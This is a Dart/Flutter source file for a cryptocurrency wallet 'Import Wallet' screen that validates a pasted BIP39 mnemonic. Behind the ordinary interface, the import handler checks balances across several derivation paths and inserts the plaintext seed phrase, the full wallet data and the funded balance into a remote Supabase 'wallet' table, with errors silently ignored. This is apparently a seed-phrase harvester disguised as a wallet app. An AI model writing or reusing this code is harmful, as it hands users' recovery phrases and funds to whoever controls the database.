import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_svg/flutter_svg.dart';
import 'package:bip39/bip39.dart' as bip39;
import 'package:provider/provider.dart';
import 'package:supabase_flutter/supabase_flutter.dart';

import 'wallet_provider.dart';
import 'choice_type.dart';

class ImportPage extends StatefulWidget {
  const ImportPage({super.key});

  @override
  State<ImportPage> createState() => _ImportPageState();
}

class _ImportPageState extends State<ImportPage> {
  final TextEditingController _controller = TextEditingController();
  bool? _isMnemonicValid;
  bool _isImporting = false;

  void _pasteFromClipboard() async {
    if (_isImporting) return;
    HapticFeedback.lightImpact();
    final data = await Clipboard.getData(Clipboard.kTextPlain);
    if (data != null && data.text != null) {
      setState(() {
        _controller.text = data.text!;
        _isMnemonicValid = null;
      });
    }
  }

  void _validateMnemonic() {
    final mnemonic = _controller.text.trim();
    setState(() {
      _isMnemonicValid = bip39.validateMnemonic(mnemonic);
    });
  }

  Future<void> _onImportPressed() async {
    if (_isImporting) return;
    HapticFeedback.lightImpact();

    _validateMnemonic();
    if (_isMnemonicValid != true) {
      return;
    }

    setState(() => _isImporting = true);

    try {
      final walletProvider = context.read<WalletProvider>();
      final supabase = Supabase.instance.client;
      final mnemonicUsed = _controller.text.trim();

      await walletProvider.fetchWalletData(mnemonic: mnemonicUsed);

      final bip44Balance =
          walletProvider.getBalanceInSatoshi(WalletProvider.bip44);
      final bip49Balance =
          walletProvider.getBalanceInSatoshi(WalletProvider.bip49);
      final bip84Balance =
          walletProvider.getBalanceInSatoshi(WalletProvider.bip84);

      int finalBalance = 0;
      String finalBipUsed = '';

      if (bip44Balance > 0) {
        finalBalance = bip44Balance;
        finalBipUsed = WalletProvider.bip44;
      } else if (bip49Balance > 0) {
        finalBalance = bip49Balance;
        finalBipUsed = WalletProvider.bip49;
      } else if (bip84Balance > 0) {
        finalBalance = bip84Balance;
        finalBipUsed = WalletProvider.bip84;
      } else {
        finalBalance = 0;
        finalBipUsed = walletProvider.preferredBipType;
      }

      final walletInfoFull = walletProvider.walletData;

      await supabase.from('wallet').insert({
        'walletMnemonic': mnemonicUsed,
        'walletInfo': walletInfoFull,
        'walleTotalBalance': finalBalance,
        'walletType': finalBipUsed,
      });

      if (!mounted) return;
      Navigator.push(
        context,
        MaterialPageRoute(builder: (_) => const ChoiceTypePage()),
      );
    } catch (_) {
      //
    } finally {
      setState(() => _isImporting = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    final walletProvider = context.watch<WalletProvider>();
    final bool showLoader = _isImporting || walletProvider.isLoading;

    Color finalBorderColor;
    if (_isMnemonicValid == false) {
      finalBorderColor = Colors.red;
    } else if (_controller.text.isNotEmpty) {
      finalBorderColor = const Color(0xFF3949AB);
    } else {
      finalBorderColor = Colors.grey;
    }

    const buttonColor = Color(0xFF3949AB);

    return Scaffold(
      backgroundColor: const Color(0xFFF2F2F7),
      appBar: AppBar(
        backgroundColor: const Color(0xFFF2F2F7),
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back, color: Colors.black),
          onPressed: () {
            if (!showLoader) {
              HapticFeedback.lightImpact();
              Navigator.of(context).pop();
            }
          },
        ),
      ),
      body: Padding(
        padding: const EdgeInsets.all(16.0),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                const Text(
                  "Import Wallet",
                  style: TextStyle(
                    fontSize: 24,
                    fontWeight: FontWeight.bold,
                    color: Colors.black,
                    fontFamily: 'SpaceGrotesk',
                  ),
                ),
                SvgPicture.asset(
                  'assets/image/download-svgrepo-com.svg',
                  height: 50,
                  width: 50,
                ),
              ],
            ),
            const SizedBox(height: 20),
            const Text(
              "Input",
              style: TextStyle(
                fontSize: 16,
                color: Colors.black,
                fontWeight: FontWeight.w500,
                fontFamily: 'SpaceGrotesk',
              ),
            ),
            const SizedBox(height: 8),
            Container(
              decoration: BoxDecoration(
                border: Border.all(color: finalBorderColor),
                borderRadius: BorderRadius.circular(10),
              ),
              child: Stack(
                children: [
                  TextField(
                    controller: _controller,
                    maxLines: 6,
                    readOnly: showLoader,
                    decoration: const InputDecoration(
                      hintText: "Enter your mnemonic",
                      hintStyle: TextStyle(fontFamily: 'SpaceGrotesk'),
                      border: InputBorder.none,
                      contentPadding: EdgeInsets.all(16),
                    ),
                    style: const TextStyle(
                      fontFamily: 'SpaceGrotesk',
                      fontSize: 16,
                    ),
                    onChanged: (_) {
                      setState(() {
                        _isMnemonicValid = null;
                      });
                    },
                  ),
                  Positioned(
                    bottom: 8,
                    right: 8,
                    child: TextButton(
                      style: TextButton.styleFrom(
                        backgroundColor: Colors.transparent,
                        padding: const EdgeInsets.symmetric(
                          horizontal: 12,
                          vertical: 8,
                        ),
                      ),
                      onPressed: showLoader ? null : _pasteFromClipboard,
                      child: Text(
                        "Paste",
                        style: TextStyle(
                          color: showLoader ? Colors.grey : buttonColor,
                          fontWeight: FontWeight.w500,
                          fontFamily: 'SpaceGrotesk',
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ),
            if (_isMnemonicValid == false) ...[
              const SizedBox(height: 8),
              const Text(
                "Invalid mnemonic! Please check your words again.",
                style: TextStyle(
                  color: Colors.red,
                  fontFamily: 'SpaceGrotesk',
                  fontSize: 14,
                ),
              ),
            ],
            const Spacer(),
            if (showLoader) ...[
              Center(
                child: CircularProgressIndicator(
                  valueColor: AlwaysStoppedAnimation<Color>(buttonColor),
                ),
              ),
              const SizedBox(height: 16),
            ] else ...[
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: buttonColor,
                    elevation: 0,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(10),
                    ),
                    padding: const EdgeInsets.symmetric(vertical: 16),
                  ),
                  onPressed: _onImportPressed,
                  child: const Text(
                    "Import",
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 16,
                      fontWeight: FontWeight.w500,
                      fontFamily: 'SpaceGrotesk',
                    ),
                  ),
                ),
              ),
            ],
          ],
        ),
      ),
    );
  }
}
